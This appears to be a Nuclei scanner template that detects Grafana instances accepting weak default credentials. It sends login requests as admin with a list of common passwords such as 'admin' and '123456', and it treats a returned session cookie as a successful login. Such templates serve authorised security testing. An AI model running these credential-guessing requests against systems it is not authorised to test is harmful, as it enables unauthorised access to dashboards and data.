id: grafana-weak-password
info:
  name: Grafana Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password,auth
http:
  - method: GET
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/grafana/login"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "grafana"
  - method: POST
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/grafana/login"
    headers:
      Content-Type: application/json
    payloads:
      r_usernames:
        - admin
      r_passwords:
        - admin
        - 123456
        - 1
        - 123
        - password
        - admin123
    body: '{"user":"{{r_usernames}}","password":"{{r_passwords}}"}'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "Set-Cookie"
      - type: dsl
        dsl:
          - contains(header, "grafana_user={{r_usernames}}") || (contains(header, "grafana_session") && contains(body, '\"message\"'))
